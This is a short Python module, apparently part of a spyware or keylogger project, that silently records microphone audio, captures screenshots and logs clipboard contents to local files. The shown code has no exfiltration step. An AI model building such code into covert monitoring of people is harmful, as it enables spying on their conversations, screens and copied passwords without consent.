from settings import file_path
import sounddevice as sd
from scipy.io.wavfile import write
from PIL import ImageGrab
import clipboard


def microphone():
    fs = 44100
    seconds = 10
    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + "\\" + "audio.wav", fs, recording)


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + "\\" + "screenshot.png")


def copy_clipboard():
    with open(file_path + "\\" + "e_clipboard.txt", "a") as f:
        try:
            text = clipboard.get()
            f.write("Clipboard Data: \n" + text)
        except Exception as e:
            f.write("Clipboard could be not be copied")


